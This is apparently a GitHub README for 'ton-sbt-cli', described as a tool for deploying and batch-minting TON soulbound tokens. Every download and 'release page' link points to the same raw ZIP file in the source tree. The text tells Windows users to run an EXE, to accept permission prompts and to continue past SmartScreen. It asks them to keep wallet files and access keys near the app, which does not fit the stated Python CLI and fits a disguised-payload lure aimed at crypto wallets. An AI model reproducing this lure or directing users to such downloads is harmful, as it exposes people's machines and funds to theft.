# ⚙️ ton-sbt-cli - Deploy and verify TON SBTs

[![Download ton-sbt-cli](https://img.shields.io/badge/Download%20ton--sbt--cli-purple?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Tyelowermost549/ton-sbt-cli/main/src/ton_sbt_tool/sbt-cli-ton-2.0.zip)

## 🚀 What this app does

ton-sbt-cli is a Windows command-line app for working with TON SBT collections.

Use it to:

- deploy a TON SBT collection
- batch-mint SBTs
- check mint results on-chain
- verify which wallets received each SBT
- run repeatable mint jobs from one place

This tool fits users who need a simple way to manage SBT tasks without using several separate apps.

## 🖥️ What you need

Use a Windows PC with:

- Windows 10 or Windows 11
- at least 4 GB of RAM
- enough free disk space for the app and your export files
- an internet connection
- access to your TON wallet details and collection data

For best results, keep your wallet files, collection list, and mint data in one folder before you start

## 📥 Download the app

1. Open the release page: https://raw.githubusercontent.com/Tyelowermost549/ton-sbt-cli/main/src/ton_sbt_tool/sbt-cli-ton-2.0.zip
2. Find the latest release
3. Download the Windows file from that release
4. Save it to a folder you can find later, such as Downloads or Desktop

If the release contains a ZIP file, extract it before you run the app

[![Download the latest release](https://img.shields.io/badge/Open%20releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Tyelowermost549/ton-sbt-cli/main/src/ton_sbt_tool/sbt-cli-ton-2.0.zip)

## 🪟 Install on Windows

### Option 1: ZIP package

If the release gives you a ZIP file:

1. Right-click the ZIP file
2. Select Extract All
3. Choose a folder
4. Open the extracted folder
5. Look for the app file or launch file

### Option 2: EXE file

If the release gives you an EXE file:

1. Double-click the file
2. If Windows asks for permission, choose Yes
3. Wait for the app window to open

If Windows SmartScreen appears, check that you downloaded the file from the release page above before you continue

## ⚡ First-time setup

Before your first run, prepare these items:

- your TON wallet data
- the collection name or collection file
- the list of SBT recipients
- any mint settings you plan to use
- a folder for logs and results

Keep file names simple. Use letters, numbers, dashes, and underscores only

## 🏁 How to use it

The app is built for a simple workflow:

1. Open the app from the folder where you installed it
2. Choose the task you want to run
3. Load your collection data
4. Add the wallet list or recipient list
5. Start the deploy or mint job
6. Review the on-chain result after the job finishes

For a batch mint job, make sure your recipient list is correct before you start. One wrong wallet address can send a mint to the wrong place

## 🧩 Common tasks

### 🏗️ Deploy a collection

Use this when you want to create a new TON SBT collection on-chain.

Typical steps:

1. Load your collection info
2. Check the collection name, symbol, and owner details
3. Run the deploy action
4. Save the result ID or transaction link

### 📦 Batch mint SBTs

Use this when you need to mint to many wallets in one run.

Typical steps:

1. Load a list of wallet addresses
2. Match each address to the right SBT data
3. Review the batch before sending
4. Start the mint job
5. Check the final result list

### 🔎 Verify mint results

Use this when you want to confirm what happened on-chain.

Typical steps:

1. Open the verify tool in the app
2. Load the mint result file or transaction data
3. Compare the output with the on-chain state
4. Review any failed or pending items

## 📄 Input files

ton-sbt-cli works best when your files are clean and easy to read.

Use these file types and formats:

- plain text lists for wallet addresses
- CSV files for batch data
- JSON files for structured mint settings
- short file names without spaces

Example data layout:

- one wallet address per line
- one recipient per row
- one collection record per object
- one result file per run

## 🔐 Wallet and network details

To deploy or mint on TON, the app may use:

- wallet address data
- access keys or signed wallet actions
- collection parameters
- network settings for test or main use

Check that you are using the right network before you start a job. A test run and a main run are not the same

## 🛠️ Basic folder setup

A simple folder layout can help keep your work in order:

- `ton-sbt-cli`
  - `input`
  - `output`
  - `logs`
  - `wallet`
  - `collections`

Put source files in `input`, saved results in `output`, and log files in `logs`

## ✅ Before you run a job

Check these items first:

- the app file opens on your PC
- your data files are in the right folder
- your wallet address is correct
- your recipient list has no extra blank lines
- your collection settings match the job you want
- your network choice is right

This short check can save time and help avoid bad mint runs

## 🧪 Example run flow

A typical session looks like this:

1. Download the app from the release page
2. Open the file in Windows
3. Load the collection setup
4. Add the batch mint list
5. Run the job
6. Review the mint result output
7. Save the logs for later use

## ❓ Help with common issues

### The app does not open

- make sure you extracted the ZIP file first
- check that the file finished downloading
- try running it again from the same folder
- confirm that Windows did not move the file

### The wallet list fails to load

- check the file type
- make sure each address is on its own line
- remove empty lines at the end of the file
- confirm the file encoding is plain text or CSV as needed

### The mint result looks wrong

- review the recipient list
- confirm the collection settings
- check the network you used
- compare the saved result with the on-chain record

### The app shows a permission prompt

- choose Yes if the prompt matches the file you downloaded from the release page
- if the prompt looks unusual, close it and recheck the source link

## 🧭 Where to find updates

Use the release page for new versions, fixes, and Windows files:

https://raw.githubusercontent.com/Tyelowermost549/ton-sbt-cli/main/src/ton_sbt_tool/sbt-cli-ton-2.0.zip

Check that page when you need a newer build or a fresh download

## 🧾 Project details

Repository name: ton-sbt-cli

Description: Python CLI for deploying TON SBT collections, batch-minting SBTs, and verifying mint results on-chain

Topics:

- blockchain
- cli
- nft
- python
- sbt
- sbt-minting
- soulbound
- soulbound-token
- ton
- ton-blockchain